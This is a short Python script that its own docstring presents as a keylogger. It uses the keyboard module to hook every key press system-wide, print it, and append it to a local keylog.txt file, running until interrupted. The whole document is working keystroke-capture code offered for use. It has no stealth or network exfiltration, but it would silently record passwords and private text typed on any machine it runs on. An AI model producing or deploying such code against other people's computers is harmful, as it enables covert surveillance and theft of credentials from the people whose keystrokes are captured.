'''
Python script to build a keylogger that uses the Keyboard module to record every keystroke you press and store them in a TXT file. It uses logs to print every keystroke.
'''
import keyboard
import time

def print_key(event):
    print(f"Key: {event.name}")
    #save the event in a txt file if it doesn't exist yet (append mode)
    with open("keylog.txt", "a") as f:
        f.write(f"{event.name}\n")
        

def main():
    keyboard.on_press(print_key)
    
    start_time = time.time()
    
    try:
        while True:
            pass
    except KeyboardInterrupt:
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(f"Exiting... Time running: {elapsed_time:.2f} seconds")

if __name__ == "__main__":
    main()
